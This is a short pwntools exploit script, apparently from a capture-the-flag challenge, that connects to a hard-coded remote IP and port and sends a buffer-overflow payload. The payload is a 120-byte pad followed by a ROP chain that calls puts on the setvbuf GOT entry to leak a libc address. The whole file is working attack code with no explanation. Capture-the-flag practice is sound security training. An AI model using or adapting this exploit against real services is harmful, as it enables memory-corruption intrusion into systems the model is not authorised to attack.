from pwn import *

BINARY = "chall"

context.binary = BINARY
elf = context.binary
rop = ROP(elf)

p = remote("34.76.206.46", 10005)
# p = elf.process()

p.sendlineafter(b"your name: ", b"Ramesh")
p.sendlineafter(b"what you would like to do: ", b"2")

OFFSET = 120

payload = flat(
    cyclic(OFFSET),
    p64(rop.find_gadget(["ret"]).address),
    p64(rop.find_gadget(["pop rdi", "ret"]).address),
    p64(elf.got["setvbuf"]),
    p64(elf.plt["puts"]),
    p64(elf.symbols["you_cant_see_me"])
)

p.sendlineafter(b"lucky one ;): ", payload)

LEAK = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info(f"leaked address -> {hex(LEAK)}")

p.close()